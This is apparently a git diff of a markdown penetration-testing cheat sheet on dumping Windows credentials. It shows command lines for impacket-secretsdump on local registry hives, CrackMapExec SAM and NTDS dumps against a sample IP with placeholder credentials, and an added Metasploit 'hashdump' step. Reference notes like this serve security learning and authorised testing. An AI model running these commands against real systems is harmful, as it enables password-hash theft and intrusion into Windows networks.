@@ -1,4 +1,4 @@
-# Stealing credentials
+# Dumping credentials
 
 ## Locally
 
@@ -112,9 +112,7 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 Sections below allow us to dump credentials from Kali linux to Windows target.
 
-### w/ CrackMapExec
-
-
+### CrackMapExec
 
 #### Dump SAM <a href="#dump-sam-hashes" id="dump-sam-hashes"></a>
 
@@ -136,6 +134,14 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 
 
+
+### Metasploit
+
+If we have a open meterpreter session&#x20;
+
+```bash
+msf> hashdump
+```
 
 
 
